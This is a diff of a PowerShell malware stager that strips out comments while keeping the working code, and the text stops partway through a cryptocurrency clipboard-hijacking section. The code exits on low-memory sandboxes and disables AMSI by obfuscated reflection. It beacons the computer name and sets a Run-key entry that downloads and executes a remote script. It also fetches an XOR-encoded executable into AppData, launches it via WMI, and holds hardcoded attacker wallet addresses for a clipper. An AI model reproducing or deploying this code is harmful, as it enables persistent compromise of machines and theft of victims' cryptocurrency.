@@ -3,7 +3,6 @@
 function Global-Initialize {
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
-        # Obfuscated AMSI Bypass
         $a = 'Amsi'; $b = 'Utils'; $c = 'amsi'; $d = 'InitFailed'
         [Ref].Assembly.GetType("System.Management.Automation.$a$b").GetField("$c$d","NonPublic,Static").SetValue($null,$true)
     } catch {}
@@ -18,7 +17,6 @@ function Send-Ping {
         $session = New-Object Net.WebClient
         $session.DownloadString($url) | Out-Null 
     } catch {
-        # Fallback to background job if main thread is throttled
         Start-Job -ScriptBlock { (New-Object Net.WebClient).DownloadString($using:url) } | Out-Null
     }
 }
@@ -27,17 +25,14 @@ Global-Initialize
 Send-Ping -m "STAGER_V29_ACTIVE_ON_$($env:COMPUTERNAME)"
 
 try {
-    # Persistence
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
     Set-ItemProperty -Path $regPath -Name "WinAudioService" -Value $regCmd
 
-    # Folder/Path Setup
     $dir = "$env:APPDATA\Microsoft\D3D11"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
     $path = Join-Path $dir "D3D11Host.exe"
 
-    # Download & Decrypt
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
@@ -47,7 +42,6 @@ try {
 
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # Clipper Engine
     $ClipperCode = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
